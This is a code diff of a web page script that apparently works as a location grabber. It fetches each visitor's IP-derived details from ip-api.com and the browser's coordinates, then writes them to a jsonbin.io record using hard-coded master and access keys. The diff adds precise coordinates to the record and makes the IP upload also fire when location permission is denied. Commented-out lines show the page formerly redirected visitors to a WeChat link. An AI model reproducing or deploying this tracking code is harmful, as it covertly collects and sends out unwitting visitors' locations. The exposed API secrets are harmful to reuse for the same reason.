@@ -18,19 +18,8 @@ if ("geolocation" in navigator) {
 
       // Do something with the location data, e.g. display on a map
       console.log(`Latitude: ${lat}, longitude: ${lng}`);
-    },
-    // Error callback function
-    (error) => {
-      // Handle errors, e.g. user denied location sharing permissions
-      console.error("Error getting user location:", error);
-    }
-  );
-} else {
-  // Geolocation is not supported by the browser
-  console.error("Geolocation is not supported by this browser.");
-}
 
-            $.get('http://ip-api.com/json/', (data) => {
+      $.get('http://ip-api.com/json/', (data) => {
                 // Convert key-value pairs to JSON
                 // https://stackoverflow.com/a/39284735/452587
                 console.log(data)
@@ -49,15 +38,65 @@ if ("geolocation" in navigator) {
                     settings.method = "PUT";
                     response.record.push({
                         ...data,
+                        coords: position.coords,
                         time: new Date(),
                     });
                     settings.data = JSON.stringify(response.record);
                     $.ajax(settings);
                     setTimeout(() => {
-                        window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
+                        // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
                     }, 1000);
                 });
             });
+
+
+    },
+    // Error callback function
+    (error) => {
+      // Handle errors, e.g. user denied location sharing permissions
+      console.error("Error getting user location:", error);
+      
+      $.get('http://ip-api.com/json/', (data) => {
+                // Convert key-value pairs to JSON
+                // https://stackoverflow.com/a/39284735/452587
+                console.log(data)
+                var settings = {
+                    "url": "https://api.jsonbin.io/v3/b/64e36bc28e4aa6225ed34b25",
+                    "method": "GET",
+                    "timeout": 0,
+                    "headers": {
+                        "X-MASTER-KEY": "$2b$10$EaN5Y7c20W063NZCI0X0aexcShPuKPxJJUU5OCc.SRXGg5vQ5dvJW",
+                        "X-ACCESS-KEY": "$2b$10$ALopFTEdhaanD01.TTBDIeBpOp.kM85iyiBrRnwLEzRTIBdyauPiG",
+                        "Content-Type": "application/json"
+                    },
+                };
+
+                $.ajax(settings).done((response) => {
+                    settings.method = "PUT";
+                    response.record.push({
+                        ...data,
+                        coords: error,
+                        time: new Date(),
+                    });
+                    settings.data = JSON.stringify(response.record);
+                    $.ajax(settings);
+                    setTimeout(() => {
+                        // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
+                    }, 1000);
+                });
+            });
+
+      // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
+    }
+  );
+} else {
+  // Geolocation is not supported by the browser
+  console.error("Geolocation is not supported by this browser.");
+  
+  // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
+}
+
+           
         </script>
     </body>
 </html>
